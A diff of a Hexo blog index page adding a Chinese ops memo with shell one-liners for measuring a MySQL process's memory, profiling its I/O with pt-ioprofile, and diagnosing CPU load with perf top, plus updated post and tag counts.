+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/运维相关命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/运维相关命令/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:26:56+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="获取端口实际使用内存大小"><a href="#获取端口实际使用内存大小" class="headerlink" title="获取端口实际使用内存大小"></a>获取端口实际使用内存大小</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid=`netstat -anp|grep -i mysqld|grep LISTEN |grep tcp |grep 3316 |awk <span class="string">'&#123;print $7&#125;'</span> |awk -F<span class="string">'/'</span> <span class="string">'&#123;print $1&#125;'</span>`;ps -e -o <span class="string">'pid,comm,rsz'</span>|egrep <span class="string">'mysqld '</span>|grep <span class="variable">$pid</span>|awk <span class="string">'&#123;print $3/1024/1024"G"&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql统计io分布"><a href="#mysql统计io分布" class="headerlink" title="mysql统计io分布"></a>mysql统计io分布</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pt-ioprofile -p 31306 --run-time=60 --save-samples=./mysql_ioprofile.txt --group-by=filename --cell=count --aggregate=sum</span><br></pre></td></tr></table></figure>
+
+<h2 id="神级命令-perf"><a href="#神级命令-perf" class="headerlink" title="神级命令 perf"></a>神级命令 perf</h2><blockquote>
+<p>首先用top看看，确认是mysqld消耗了cpu然后登陆到MySQL show processlist，看看有没有异常，检查一下threads_running/QPS/TPS有没有显著提高，确认一下是否有慢查询，如果这些都不能帮助你找到问题，就借助神一样的工具perf top，可以看到cpu都用在执行哪个函数了，这样应该可以找到问题原因</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perf top -p 3774</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://hualet.org/blog/2018/06/16/%E4%BD%BF%E7%94%A8-perf-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/" target="_blank" rel="noopener">使用 Perf 优化程序性能</a></p>
+<p><a href="http://linuxperf.com/?cat=4" target="_blank" rel="noopener">性能工具(特别推荐)</a></p>
 
           
         
@@ -2059,7 +2238,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2107,7 +2286,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-count">78</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2118,7 +2297,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2129,7 +2308,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
